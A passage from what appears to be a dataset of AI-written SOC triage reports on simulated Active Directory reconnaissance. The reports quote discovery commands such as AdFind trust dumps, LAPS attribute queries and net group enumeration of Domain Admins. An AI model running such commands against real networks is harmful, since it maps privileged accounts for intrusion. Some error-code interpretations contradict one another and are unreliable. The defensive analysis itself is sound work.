   - Confirm if any critical system files, configurations, or logs have been altered or tampered with."
operating system discovery,"### Analysis of the Windows Event Logs

#### **System Log**

The events in the System Log primarily consist of entries related to time synchronization and timezone updates. These are standard processes conducted by the Windows time service (W32Time) and kernel time changes via `svchost.exe`. This activity is common as Windows servers routinely synchronize time with external sources (like `time.windows.com`), ensuring the system clock is accurate.

#### **Windows PowerShell Log**

The PowerShell logs indicate basic initialization activities with various providers such as Registry, Alias, Environment, etc., being started. The command executed `powershell.exe & {Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null}` is a standard command to fetch Windows operating system details. There is no evidence of malicious activity in the execution of this script, as it's commonly used for system information retrieval.

#### **Security Log**

The `Security` logs include event ID 4616, which signals the system time was altered by `svchost.exe`, running under the Local Service account. This aligns with typical time synchronization activities and does not directly imply any malicious actions without further indicators of compromise.

#### **Sysmon Log**

In the Sysmon logs, several processes are observed, most notably:
- Execution of `whoami.exe` and `hostname.exe`, tools commonly used for obtaining information about the user and system, respectively. These events might be related to administrative or automated tasks, as there are no unusual command-line arguments suggesting malicious use.
- The use of `wevtutil.exe` is noted multiple times, a tool for managing Windows Event Logs. Frequent invocation of this could be suspicious if used to tamper event logs, but without additional suspicious parameters or resulting effects, it cannot be marked definitively as malicious.
- A PowerShell process running a non-malicious `Get-CimInstance` command is observed.
- Other activities involving standard system processes (`svchost.exe`, `conhost.exe`) are noted without explicit signs of tampering or compromise beyond typical operations.

#### **Application Log**

The Application log event related to the Software Protection Platform Service (`sppsvc.exe`) is routine activity for licensing and activation checks. It shows normal operational behavior of Windows services.

### Assessment

- **Suspicious Activity:** The frequent execution of `wevtutil.exe` is noteworthy; however, at present, there is no direct evidence it was used for malicious purposes.
- **General Activity:** The PowerShell and other command-line executions recorded indicate normal administrative or script-based operations on the server.
- **Risk Assessment:** Without further context or related logs suggesting a breach (such as unexpected network communication, modified system files, etc.) the observed activities do not conclusively point to a security incident.

### Recommendation

Given the data provided, the current finding is marked as **SUSPICIOUS** due to the potential implications of `wevtutil.exe` usage in log manipulation. It would be prudent to:
1. Review user activity around this timeframe and check for authorized administrative actions or scripts.
2. Investigate if `wevtutil.exe` or other processes exhibited unusual patterns in command-line usage or execution frequency in log entries outside this time window.
3. Conduct further scrutiny of any network logs or employ additional endpoint monitoring to detect unseen anomalies.

Conclude with escalating the review of related systems or users if additional suspicious behavior is detected."
Adfind - Enumerate Active Directory Trusts,"Upon analyzing the given Windows event logs, several items stand out that may warrant further investigation.

1. **Process Execution:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed by the user `SERVER002\\admin_test`. While these might be normal operations, the specific usage and frequency can be unusual, especially if associated with administrative or diagnostic purposes without clear, routine tasks.
   - There is a `cmd.exe` execution with a command that involves `AdFind.exe`. This tool is often used in environments to query Active Directory, but it is also known to be used by attackers for reconnaissance within compromised environments. The command includes `-gcb -sc trustdmp`, which suggests collecting trust domain information, an activity often associated with lateral movement planning.
   
2. **PowerShell Execution:**
   - An instance of `powershell.exe` is run by the user `SERVER002\\admin_test`. PowerShell can be used legitimately, but given its capability to execute scripts, it is frequently used in attacks. However, without the command-line details, it is not possible to determine if it was used maliciously this time.

3. **Usage of Windows System Utilities:**
   - The repetitive usage of `wevtutil.exe`, which is used to manage event logs, could indicate an attempt to clear or tamper with logs.

4. **Command Execution of Built-In Tools:**
   - The logs reveal executions of built-in Windows binaries `whoami.exe` and `hostname.exe`, which may be part of normal administrative tasks, but they can also be part of initial reconnaissance activities.

5. **Security Log - Privilege Assignments:**
   - The `4672` event indicates that the SYSTEM user was granted extensive privileges, as expected, and does not offer direct evidence of malicious intent. However, it confirms elevated privileges on tasks recorded.

6. **Edge Update Activities:**
   - There are numerous legitimate-looking `MicrosoftEdgeUpdate.exe` processes executing with SYSTEM privileges, appearing to manage updates for Microsoft Edge. This doesn't immediately suggest malicious activity but needs contextual verification to ensure no code injection.

**Assessment and Resolution:**
While the logs do not provide conclusive evidence of a malicious attack, there are several aspects worth investigating further. The use of `AdFind.exe` with specific flags, repetitive custom executable launches, and potentially suspicious PowerShell activity are all points to check more thoroughly—especially in the context of it being the CEO's machine, which contains sensitive data and may be targeted more frequently.

**Resolution: SUSPICIOUS**
Further investigation is warranted. It would be wise to:
- Investigate the context of `AdFind.exe` and verify if such usage was intended.
- Check the PowerShell logs for specific command-line arguments or scripts executed.
- Verify the purpose of repetitive `wevtutil.exe` executions to ensure they are legitimate.
- Conduct a broader threat-hunting session on endpoints to search for similar patterns.

This approach will help clarify the intent behind the activities and ensure no oversight on potentially malicious elements."
Remote System Discovery - nltest,"Upon analyzing the provided Windows event logs, I have evaluated the data across various logs. Here is the breakdown:

**Application Log:**
- There is no suspicious activity in the Application log, where Windows Defender is shown as active, which is a positive indicator for security posture.

**Windows PowerShell Log:**
- The log entries for Windows PowerShell are missing, preventing analysis of PowerShell activities which can often reveal signs of suspicious or malicious command execution.

**Security Log:**
- Repeated Event ID 5379 entries indicate attempts to read credentials, specifically targeting Microsoft accounts with a username ""02txoixylodcstop"". However, the count of credentials returned is zero, and they all have the same unusual return code (3221226021), suggesting possible failed or blocked attempts at credential reading.
- Event ID 4624 and 4672 indicate a successful logon with elevated privileges (SeDebugPrivilege, etc.) for the SYSTEM account using Windows services (services.exe and Advapi). While privileges like SeDebugPrivilege can be used maliciously, there is no direct evidence here of misuse.
 
**System Log:**
- Windows Update events (Event ID 43, 44) suggest that a security intelligence update for Microsoft Defender Antivirus was executed successfully, indicating regular update activity.

**Sysmon Log:**
- A series of processes such as `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, `nltest.exe`, and other legitimate system processes like `taskhostw.exe`, `wuauclt.exe`, and `microsoftedgeupdate.exe` appear in the logs. While these are normal processes, their appearance in rapid succession may indicate script or task automation, often characteristic of system maintenance tasks or administrative scripts.
  
**Assessment:**
- **Suspicious Activity:** The repeated credential reading attempts for a Microsoft account in the Security logs are unusual. Although unsuccessful, this pattern suggests an entity tried to access account credentials, implying a potential reconnaissance or attempted lateral movement.
- **Normal Activity:** Most other logs depict regular system and user activities, such as updates and process executions that match standard Windows operational behavior.

**Conclusion & Recommendation:**
- **Resolution:** SUSPICIOUS
- The logs contain activities that don't look entirely right and warrant further investigation, especially concerning credential access attempts.
- **Guidance:** 
  - Investigate the origin of credential access attempts in the Security log (Event ID 5379) to determine if they are benign, a result of misconfiguration, or a failed attempt at malicious activity.
  - Conduct a detailed review of PowerShell command usage and network activity around the time of suspicious credential events, if possible, to trace the source and intent of these actions.
  - Monitoring for any escalation in account or network access attempts, particularly from new or unexpected devices, would be prudent.

Despite no confirmation of definitive malicious activity, the behavior noted indicates a need for vigilance and potential threat identification."
GetCurrent User with PowerShell Script,"The given Windows event logs provide a wide array of information related to different processes and operations on the system identified as ""Server002"". Here's a breakdown of the notable entries:

### Security Log Analysis:
1. **Event ID 4624 (Logon Event):** 
   - A successful logon event for SYSTEM using a service startup logon (Logon Type 5). This is commonly seen when the system services start using the LocalSystem account and is generally normal for system operations.

2. **Event ID 4672 (Special Privileges Assigned):**
   - The SYSTEM account is granted several high-level privileges, including SeDebugPrivilege. This is normal for the SYSTEM account and expected in routine operations.

3. **Event ID 5379 (Credential Validation):**
   - Events showing credential validation attempts that failed (ReturnCode: 3221226021 = \(""STATUS_NO_SUCH_USER""). The repeated attempts to validate credentials with the account ""02txoixylodcstop"" suggest unsuccessful attempts to access a Microsoft Account. Typically, this can occur due to incorrect configurations or an attempt to use an incorrect account.

### System Log Analysis:
- Involves updates to the Microsoft Defender Antivirus definitions, indicating routine maintenance through Windows Update mechanisms. The absence of errors here suggests successful update operations.

### PowerShell Log Analysis:
- PowerShell events indicate the execution of a script that writes the current user object to a file. Use of `Out-File` is common for scripts logging user information, and while such operations can be part of administrative tasks, they also can be indicative of data gathering by malicious scripts.

### Sysmon Log Analysis:
1. **Process Creation Events:**
   - The execution of wevtutil.exe and conhost.exe by a non-standard admin user ""admin_test"" could be normal, as wevtutil is used to interface with event logs. However, an unusual user context should be considered, especially if this user isn't recognized or expected to perform such tasks.

2. **Execution of HOSTNAME.EXE and WHOAMI.EXE:**
   - These tools are typically used for gathering system information and validating user credentials, respectively. Their execution in cascade can signify troubleshooting commands or potentially malicious reconnaissance activities.

3. **Microsoft Edge Update and Install Processes:**
   - Several processes related to Microsoft Edge updates are visible. These are expected and typical behaviors whenever Microsoft Edge is updated on Windows systems.

### Assessment and Resolution:
- **Suspicious Behavior:**
  - The repeated failed credential validation attempts, the use of PowerShell to capture current user information into a text file, and the execution of system commands like `whoami` and `hostname` by an unexpected user account (admin_test) require further scrutiny.

- **Benign Indicators:**
  - The system logs indicate updates and resource changes that appear normal for system maintenance.

### Final Resolution: **SUSPICIOUS** 
- The activities noted could be part of legitimate administrative and update processes. However, due to the failed access attempts, unexpected data logging through PowerShell, and potentially unauthorized use of high-level privileges and reconnaissance commands by an uncommon admin account, a deeper investigation is warranted. 

### Guidance:
- Verify the legitimacy and purpose of the ""admin_test"" account's activities.
- Check for any unauthorized scripts or scheduled tasks that may have facilitated unexpected PowerShell executions.
- Review systems for any signs of unauthorized access attempts linked to the Microsoft Account observed.
- Monitor for recurrence of such events and ensure proper auditing is in place for key accounts.
"
Adfind - Enumerate Active Directory Exchange AD Objects,"Upon reviewing the provided logs, the analysis reveals several points of interest and potential concerns:

1. **Logon Events (4624) and Privilege Use (4672):**
   - There are multiple logon (Event ID 4624) and privilege use (Event ID 4672) events where the target username is ""SYSTEM"" and privileges such as `SeDebugPrivilege` are being used. While SYSTEM logons are typical for background services, the simultaneous execution and privileges involved could suggest the presence of automated tasks or elevated activities.

2. **Process Creation and Execution:**
   - The presence of `wevtutil.exe` in the Sysmon logs suggests manipulation or querying of event logs, potentially indicative of a malicious actor attempting to gather information about logged activities or covering tracks.
   - Execution of `cmd.exe` with specific command-line arguments pointing to a potentially suspicious executable `AdFind.exe` located in a temporary directory. This tool is often used for Active Directory reconnaissance, which is suspicious behavior on a CEO’s machine.

3. **User Account Enumeration (Event ID 4798):**
   - The frequent querying of user accounts including `Administrator` and `admin_test` could suggest an adversary attempting to gather information about the system’s user accounts, which is characteristic of reconnaissance activity.

4. **Edge Update and Other Legitimate Processes:**
   - Multiple instances of Microsoft Edge Update processes and other system processes like `CompatTelRunner.exe` are noted, which could be part of legitimate system updates or maintenance routines. However, the sheer volume of these and their proximity to suspicious activity should not be overlooked.

5. **Credential Validation Failures (Event ID 5379):**
   - There are several credential validation failures, as indicated by the return code, associated with what seems to be attempts to access MicrosoftAccount or WindowsLive tokens. This might suggest failed or unauthorized attempts to access online credentials/services.

In conclusion, while some activities might be associated with routine system updates and maintenance, specific entries around the use of `AdFind.exe`, enumeration of accounts, `wevtutil.exe` usage, and credential validation failures stand out. This pattern of activities, especially on a high-profile user like the CEO, raises concerns of potential reconnaissance or privilege escalation attempts.

**Resolution:** **SUSPICIOUS**

**Recommendation:** Conduct a deeper investigation by:
- Isolating the machine from the network to prevent any potential spread or further activities.
- Running a thorough malware scan and investigation on the system, checking for the presence of known tools used similarly to `AdFind.exe`.
- Reviewing firewall and network access logs for any unusual outbound connections.
- Considering a review or reset of account passwords, especially admin-related accounts, and evaluating multifactor authentication (MFA) options to bolster security further."
Suspicious LAPS Attributes Query with Get-ADComputer all properties,"Analyzing the provided logs, I have identified certain parts that could potentially indicate suspicious or anomalous behavior:

1. **Unusual Process Executions and Patterns:**
   - **Multiple `wevtutil.exe` and `conhost.exe` Executions**: These processes are commonly seen in legitimate use (such as event log management and console host operations). However, the frequency of execution in rapid succession and the pattern observed in the logs might indicate a scripted or automated process execution could be leveraged by an attacker or might represent routine automated tasks.
   
   - **Execution of PowerShell**: A PowerShell process runs the command `Get-ADComputer $env:computername -Properties *` under an account with high integrity (`High`). The command retrieves comprehensive information about the computer in Active Directory, which is not inherently malicious, but PowerShell's capabilities make it a potential tool for abuse if used by unauthorized parties.

2. **Command-Line Arguments:**
   - The command executed with `PowerShell` is legitimate and not inherently malicious on its own but should be scrutinized if it was unexpected or unauthorized by the user.

3. **High Integrity Level and User Privilege:**
   - The executions are running under the user `SERVER002\admin_test` with high integrity level, implying administrative privileges were used, common for legitimate administration, but they can also be indicative of lateral movement or privilege escalation post-compromise.

4. **Edge Update Process**:
   - The logs show Edge Update processes running, consistent with legitimate installation or update activities, suggesting normal, benign system behavior. However, given the frequency, it could be worth ruling out attempts to hide malicious payloads in these updates.

**Assessment**:
- Based on the analyzed logs, the activities observed can be symptomatic of either routine administration/automated maintenance scripts or possibly an automated script run by an unauthorized party. The processes do not inherently indicate malicious activity at a surface level, but the pattern of repeated executions, particularly of `wevtutil.exe`, `conhost.exe`, and PowerShell, merits further scrutiny.

**Resolution**: **SUSPICIOUS**
- Although no direct evidence of compromise is present, the frequent execution of key processes suggests further investigation is necessary. Checking with the `server002\admin_test` account holder or IT personnel for authorized scripts could clarify the purpose of these executions. Logs should be expanded to correlate with network activity or identify any unusual user behaviors, and relevant security software logs should be checked for additional alerts or anomalies.

It is recommended to verify if these actions were expected as part of routine operations or if they align with typical user or automated behavior on this machine. If unauthorized, extensive log and network analysis should be conducted to confirm or rule out malicious intent."
Suspicious LAPS Attributes Query with adfind all properties,"Based on the Windows event logs provided, the following analysis highlights suspicious and potentially malicious activities:

### Observations:
1. **Use of `wevtutil.exe`**: There are multiple entries with `wevtutil.exe` being executed by the user `SERVER002\\admin_test`. The `wevtutil` tool is a legitimate Windows utility used for managing Windows Event logs. However, its execution, especially in quick succession or in conjunction with other tools, can be indicative of log tampering or reconnaissance activity by an attacker attempting to cover their tracks or gather information from the logs.

2. **Presence of AdFind Utility**: 
   - The execution of `powershell.exe` with the command line invoking `AdFind.exe` is present in the logs. `AdFind` is a legitimate tool used to query Active Directory, commonly used by malicious actors for reconnaissance activities.
   - The command line used within PowerShell attempts to query Active Directory objects using AdFind is a classic technique seen during sophisticated attacks for gaining information about the domain or network environment.

3. **Command Execution through PowerShell**:
   - There's a use of PowerShell with execution of potentially unwanted software like `AdFind.exe` from a temporary directory path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe`.
   - PowerShell being used to execute commands from temporary directories is often associated with transient malicious activity due to the ephemeral nature of such directories.

4. **Frequent Execution of Utility Tools**: Utilities such as `hostname.exe`, `whoami.exe`, and `conhost.exe` are normally benign; however, their execution frequency and usage pattern aligned with other suspicious activities can hint at attack techniques like environment discovery or privilege confirmation by an adversary post-compromise.

### Assessment:
Given the presence of a legitimate tool used in illegitimate contexts (AdFind), the execution of system utilities like `wevtutil.exe` in a pattern that may suggest log manipulation or reconnaissance, and the unconventional use of PowerShell, the logs present several indicators of potentially malicious activity.

### Conclusion:
- **Resolution**: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the system `Server002` from the network to prevent further malicious activity or data exfiltration.
2. **Forensic Analysis**: Conduct a deeper forensic analysis on `Server002` to acquire more evidence of compromise and understand the scope and impact.
3. **Review User Accounts**: Inspect activities associated with `admin_test` and any elevated access attempts as well as potential compromised accounts.
4. **Investigate Other Endpoints**: Examine other systems in the network for similar patterns of activity to determine if this behavior is widespread or localized.
5. **Enhance Monitoring and Logging**: Ensure comprehensive monitoring and logging are in place to capture similar events, particularly those related to PowerShell, wevtutil, and any use of external tools like AdFind.
6. **Incident Response**: Initiate a full incident response plan to address the compromise, including identifying the initial access vector, and enhancing defenses to prevent future incidences."
Enumerate Active Directory for Unconstrained Delegation,"### Detailed Analysis

**Windows PowerShell Logs:**

- The logs reveal a PowerShell command executed on `Server002` with the application path: `powershell.exe & {Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain}`. This command attempts to query Active Directory for objects (typically users) with a specific attribute related to delegation (`UserAccountControl` flag 524288).
  
- Although querying Active Directory can be legitimate, the specific LDAP filter here focuses on privileged accounts to discover potentially sensitive user accounts, which is often seen during reconnaissance phases in attacks.

**Sysmon Logs:**

- Repeated execution of `powershell.exe` by the user `SERVER002\admin_test` is corroborated in the Sysmon logs, which shows this executed with a high integrity level, indicating it may have elevated privileges.

- The use of system tools like `conhost.exe`, `wevtutil.exe`, and `wermgr.exe` alongside PowerShell execution by the same user is typical in advanced attacks where attackers might be manipulating Windows Event Logs or querying system settings to evade detection.

- Multiple invocations of `MicrosoftEdgeUpdateComRegisterShell64.exe` executed under the `NT AUTHORITY\SYSTEM` user is typical behavior for Edge updates but, given the timing and context of other activities here, could suggest a cover for additional actions. These should be cross-verified for any anomalies.

**Application Logs:**

- Normal Edge update procedures appear to be executed around the same time. While typically benign, these updates are surrounded by more suspicious activity, raising questions about potential misuse of the process for lateral movement or cover.

**Security and System Logs:**

- There are no direct entries in the provided Security or System logs, which could either imply no windows security events were captured during this period or highlight potential gaps in logging where notable security events might have cropped up but were not logged.

### Assessment and Conclusion

The logs show one particular PowerShell execution that stands out due to its specificity and potential to aid in privilege escalation or exfiltration tasks within a corporate network context. The absence of companion security logs leaves a gap in context that might otherwise clarify user intent. Coupled with the reconnaissance nature of AD queries and potential misuse of system processes for hiding or further actions, this activity cannot be considered benign based on logs alone.

### Resolution: **SUSPICIOUS**

### Guidance on Proceeding:

1. **Immediate Action:**
   - Conduct a thorough review of the user account `SERVER002\admin_test`, especially focusing on recent login patterns and privilege assignments. Determine if there were any changes or unusual access patterns using centralized authentication logs.
   
2. **Contextual Inquiry:**
   - Correlate these activities with endpoint logs to verify if this action was part of a script or authorized IT operation.
   - Verify the PowerShell script's origin. If it was a legitimate administrative task, document and adjust monitoring configurations accordingly.

3. **Enhanced Monitoring:**
   - Implement monitoring for excessive AD querying from user accounts or PowerShell executions involving critical flags.
   - Enable additional Sysmon logging rules to capture more granular command-line activities, if not already active.

4. **Engage Incident Response (IR) Team:**
   - Perform a file integrity check on systems involved and ensure no unauthorized changes have taken place.
   - Based on findings, assess if further Incident Response actions are necessary, such as containment or eradication steps.

5. **User Awareness and Training:**
   - Brief involved staff on the potential risks associated with specific command executions and on maintaining vigilance against unauthorized actions posing as standard updates or typical tasks."
Discover System Language by Windows API Query,"Upon reviewing the provided event logs, several observations can be made regarding potential indicators of suspicious or malicious activity:

### Observations:

1. **Repetitive Logon Events (Event ID 4624 and 4672):**
   - Multiple logon events with LogonType 5 (which corresponds to a service start) were observed for the SYSTEM account and Server002$ machine account. This type of logon is expected for system and service operations, especially on a server.
   - Privileges such as SeDebugPrivilege and SeTcbPrivilege were granted to the SYSTEM account, indicative of normal, though highly privileged operations typically required for system processes.

2. **Credential Validation Errors (Event ID 5379):**
   - Multiple entries indicate failure to validate credentials for a Microsoft account or Windows Live ID (02txoixylodcstop). These events indicate unsuccessful access attempts. The occurrence might suggest either a misconfiguration or possible scanning or brute force attempts against user accounts. The specific return code (3221226021) indicates a failure due to ""The request is not supported"", which could suggest application-level failures rather than typical authentication failures.

3. **Sysmon Process Creation Events (Event ID 1 and 5):**
   - The Sysmon logs show routine system processes being created, such as `wevtutil.exe`, `svchost.exe`, `whoami.exe`, and others. Most processes are executed with the NT AUTHORITY\SYSTEM user. 
   - Notably, a suspicious command line is observed in Event ID 18036 where `cmd.exe` is used to execute `LanguageKeyboardLayout.exe` from a Temp directory, typically indicative of potential malicious activity such as an executable being run in a suspicious location. The hash of the executable was also provided, which should be further analyzed against malware databases.

4. **Suspicious Process Activity (Event ID 1 and 5):**
   - The file `LanguageKeyboardLayout.exe` is executed from a temporary directory without company or product descriptions, raising potential red flags associated with its purpose. Downloads and execution from `Temp` folders typically suggest malicious behavior unless specifically whitelisted or expected during known operations.
   - Additionally, several processes are executed as `SERVER002\admin_test`, which should be reviewed to confirm this user's typical behavior and authorizations.

5. **Command-Line Tools Usage:**
   - The presence of `whoami.exe` and `hostname.exe` indicates an interest in system detail gathering. Whilst not inherently malicious, in tandem with other suspicious activities, such invocations may suggest a reconnaissance phase by a misconfigured or attacked process.

### Assessment:

- The repetitive credential failures, the execution of unusual processes from temporary directories, and command line executions suggest potential reconnaissance or exploitation activities indicating a compromised state or an attempt towards such.
- Observed legitimate system processes and privilege assignments, combined with unexpected process activities, make this a suspicious case requiring further scrutiny.

### Resolution:

- **Resolution: SUSPICIOUS**
  - The logs contain indications of potentially suspicious activity, including unauthorized execution paths and failed credential verifications. Immediate action should involve deeper investigation into the specific processes (e.g., `LanguageKeyboardLayout.exe`) and the `admin_test` account activities across the time frame in question. Consider isolating or securing the systems, conducting threat intelligence lookups on hashes, and potentially resetting credentials associated with suspicious access attempts."
Detect a Debugger Presence in the Machine,"Upon analysis of the logs provided, several potential areas of interest arise that can be grouped into the following observations and deductions:

### Observations:
1. **Time Change Events:**
   - Multiple time change events have been recorded almost simultaneously within a very short duration. For example, consecutive log entries in the System log show the time being adjusted twice in quick succession (`EventID: 1, 24` in System and Security logs, and `4616` in Security logs). This can indicate a manual adjustment or could be symptomatic of a clock synchronization issue. However, such frequent changes without an apparent system reason might warrant further attention.

2. **PowerShell Script Execution:**
   - There is evidence of PowerShell activity (`EventID: 600`). The execution involves checking for debugger processes and debugging flags, indicating potential debugging or anti-debugging attempts. This can sometimes reflect a malicious actor attempting to evade detection by a debugger.

3. **High Privilege Access (Security Log):**
   - An account named `admin_test` receives high-level privileges (`EventID: 4672`). The user received various sensitive permissions, such as `SeDebugPrivilege`, which can be a typical target in privilege escalation attacks, as these permissions allow extensive control over system operations.

4. **Processes Execution (Sysmon Log):**
   - Numerous instances of system binaries like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are seen executing with the user `admin_test`. While these processes are legitimate, their execution sequence, alignment with high privilege acquisitions, or lack of typical contextual operations might require further checking for anomalous command-line arguments which could indicate misuse.
   
5. **System and Application Updates:**
   - There are several instances involving Microsoft Edge Update processes and services (`MicrosoftEdgeUpdate.exe`), which appear to be running system updates. This activity is seen in the Sysmon, Application, and other associated logs but appears to be typical system maintenance.

### Assessment:
- **Suspicious Activities:** 
  - The frequent and rapid time change logs can be considered suspicious and may indicate tampering or syncing issues.
  - The PowerShell activity querying for debugger processes suggests potential evasion tactics, which is often flagged as suspicious, especially if not from a known or scheduled task.

- **Potential Compromise:**
  - The privilege escalation to a wide range of privileges gives the `admin_test` account potential for misuse, which is a red flag in compromised scenarios.
  - Activity patterns around this user and the processes noted could potentially imply scripting or automated actions typically associated with attacks.

### Resolution:
Given that there isn't a definitive proof of malicious compromise but substantial indicators that warrant further inspection, the logs should be classified as:

**SUSPICIOUS**

### Recommended Actions:
1. **Immediate Review:**
   - Review the `admin_test` account for unauthorized activity and consider revoking elevated privileges until a full investigation is completed.
   - Verify the source and intended purpose of the PowerShell script executions.

2. **Time Synchronization:**
   - Check system time settings and network time protocol (NTP) configurations to ascertain if the adjustments are legitimate or require corrective action.

3. **Continuous Monitoring:**
   - Enable more detailed monitoring/logging, specifically focusing on suspicious PowerShell executions and use of high-privilege system operations.

4. **Manual Audit:**
   - Conduct a manual audit of user actions around the time these events occurred to clarify the context and verify if these actions were authorized.
  
5. **Security Policies Update:**
   - Update internal threat detection rules and response playbooks to account for such suspicious patterns.

Continue with the investigation and ensure all potential vectors are thoroughly reviewed."
User Discovery With Env Vars PowerShell Script,"**Analysis of Logs:**

**1. Security Log:**
- All the events in the Security log are Event ID 5379, which signifies credential validation attempts. The repeated occurrence within a short time frame indicates multiple unsuccessful attempts to validate credentials or access tokens associated with `MicrosoftAccount:user=02txoixylodcstop` and `WindowsLive:...`. The return code `3221226021` implies ""The specified account does not exist"", which suggests failed attempts to access or validate non-existing accounts.
- This repetitive failed attempt to validate credentials is suspicious activity, suggesting a possible brute-force or account enumeration attempt, especially given the target account formats which indicate online accounts.

**2. Application Log:**
- The event with ID 15 indicates that Windows Defender is active (SECURITY_PRODUCT_STATE_ON). This is generally benign information confirming that antivirus is operational.

**3. System Log:**
- Regular activities related to Windows Update, including security intelligence updates for Microsoft Defender, are observed. These are benign and part of regular system maintenance.
- No anomalies or suspicious behavior observed here concerning unusual process execution or privilege escalation risks.

**4. Sysmon Log:**
- The execution of `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and PowerShell with events associated with them executing commands pertaining to system utilities suggest users possibly checking their current session and querying some system information. The use of `whoami.exe`, `hostname.exe`, and PowerShell scripts are not generally malicious in themselves but can be used by a hacker to gather information post-compromise. In this context, however, there is no strong evidence suggesting malicious use.
- The PowerShell command noted seems to be writing the username to a text file, which is simplistic and possibly an automated task or script — its benign nature cannot be assured without understanding its purpose or the context it was used in.

**5. Windows PowerShell Log:**
- PowerShell records indicate a session started and quickly stopped. The script logged appears to write user information to a file. While this activity alone isn’t inherently malicious, it may be part of a script run for legitimate administrative tasks or automated jobs. Given the lack of context, this behavior remains only potentially suspicious without clear evidence.

**Assessment:**
- There is a stronger indication of suspicious activity within the Security log due to the unsuccessful logon attempts targeting what appears to be an online account.
- Other logs (Application, System, and Sysmon) indicate overall benign activity with some potentially suspicious use of system commands. However, without further evidence, these do not conclusively demonstrate malicious behavior.

**Resolution: SUSPICIOUS**

**Guidance:**
- Further investigation is recommended to determine intent and context, particularly focusing on the failed credential validation attempts.
- It may be beneficial to investigate:
  - Any spike in similar logon attempt patterns on other machines.
  - Network activities corresponding to these events for signs of external connection attempts.
  - The context of PowerShell and command executions during this period to determine if these are regular admin tasks or part of a script with potential security concerns.
- Alert relevant teams to monitor for any subsequent suspicious account logon attempts, especially involving online accounts, and ensure strong monitoring and verification protections are in place."
File and Directory Discovery (PowerShell),"### Detailed Analysis of the Windows Event Logs:

#### Suspected Malicious Activity:

1. **PowerShell Activity:**
   - The execution of `powershell.exe` with recursive directory listing commands: `ls -recurse`, `get-childitem -recurse`, and `gci -recurse` suggests potentially suspicious behavior. PowerShell is a legitimate tool often used by administrators for legitimate tasks, but it is also commonly used by attackers for reconnaissance and lateral movement due to its scripting capabilities and deep integration within Windows.
   - Log entries [Sysmon EventID 1] and [PowerShell log EventID 600] indicate the use of PowerShell with these parameters initiated by a user identified as `SERVER002\\admin_test`, which is an admin-level user. Running such commands could be part of normal activity, but in the context of an alert on a CEO machine, it warrants further investigation.

2. **Time Change Events:**
   - A security log (EventID 4616) and system log entries show a back-and-forth time change:
     - PreviousTime: `2024-10-23 18:58:22.5424942`
     - NewTime: `2024-10-23 18:58:20.4270377`
   - Changing system time can be an indicator of attempts to manipulate logs or bypass security controls based on the tracking of activities by time, suggesting potential tampering.

3. **Repeated `wevtutil.exe` and `conhost.exe` Executions:**
   - `wevtutil.exe` is used to query and manage event logs, and `conhost.exe` is associated with console windows. Multiple executions are seen during the timeframe in question, potentially indicative of log tampering or console activity—especially given the `admin_test` account is actively executing these processes.

4. **Host and Identity Commands:**
   - The use of `HOSTNAME.EXE` and `whoami.exe` suggests the user is acquiring system information. These tools are often used to gather information about the current machine and user as part of initial access and enumeration, typically seen in penetration testing or unauthorized access.

#### Assessment of the Situation:

- The combination of extensive PowerShell usage with recursive listing commands, suspicious time manipulation, and the gathering of host information activity raises red flags. The account `SERVER002\\admin_test` exhibiting these behaviors, if not previously verified as legitimate operations, could indicate attempts at reconnaissance or further exploitation by a threat actor.

#### Identified Threats and Risks:

- Potential unauthorized access and reconnaissance on a machine associated with a high-profile target (the CEO).
- Possible precursor to privilege escalation or data exfiltration attempts.

#### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Confirm the legitimacy of `SERVER002\\admin_test` activity. Determine if this account or associated activity is sanctioned by IT or security teams.
   - Review recent access logs and audit trails to determine if there have been unauthorized attempts or unusual patterns associated with this account or on this machine.

2. **Containment:**
   - Isolate the affected system if unauthorized activity is confirmed to prevent potential lateral movement or data exfiltration.
   - Begin memory and network traffic analysis from the time of suspicious activities for further forensic investigation.

3. **Further Investigation:**
   - Correlate activity with other security logs to determine any associated lateral movement or data exfiltration.
   - Assess for malware presence, potentially utilizing indicators of compromise (IoC) for known attack signatures.

4. **Strengthening Security Controls:**
   - Implement enhanced monitoring of PowerShell activities with command-line auditing to ensure greater visibility.
   - Ensure time synchronization and alert on unauthorized system time changes.

**Resolution: SUSPICIOUS**

While the activities could potentially have non-malicious explanations, the context and pattern of events indicate the need for detailed investigation to rule out a compromise."
Elevated group enumeration using net group (Domain),"### Analysis of the Windows Event Logs:

**1. Overview of Key Events:**

Events are captured for process creations and terminations, and privilege escalations on SERVER002. Various process activities are logged, such as the execution of Microsoft Edge Update-related files and system utilities like `whoami`, `cmd`, `net`, `wevtutil`, and `hostname`.

**2. Breakdown of Events:**

- **Microsoft Edge Update Activity:**
  - Numerous processes related to Microsoft Edge Update (e.g., `MicrosoftEdgeUpdate.exe`) are observed. These are typically legitimate and scheduled processes by Microsoft for updating the Edge browser. 

- **`whoami.exe` Execution:**
  - The presence of `whoami.exe` executed by `SERVER002\admin_test` might be benign or used as a reconnaissance step if executed with malicious intent to gather user info.
  
- **Suspicious `cmd.exe` Activity:**
  - An unusual execution of `cmd.exe` executing multiple `net` commands to enumerate user groups such as ""Account Operators"", ""Exchange Organization Management"", ""Domain Admins"" is highly suspicious. These commands are often used by attackers to gather information about privileged groups:
    - `net groups ""Account Operators"" /doma`
    - `net group ""BUILTIN\Backup Operators"" /doma`
    - `net group /domai ""Domain Admins""`
  
- **Wevtutil and conhost Activity:**
  - Repeated execution of `wevtutil.exe` and `conhost.exe` might indicate log tampering or attempts to read event logs, which is suspicious activity often associated with cover-up operations.

- **Security Logs and Privileges:**
  - Event ID 4634 documents a logoff event for `admin_test`. Event ID 4672 indicates the granting of high-level privileges such as `SeDebugPrivilege` to `admin_test`, which can allow process manipulation and is dangerous if misused.
  
- **Authentication:**
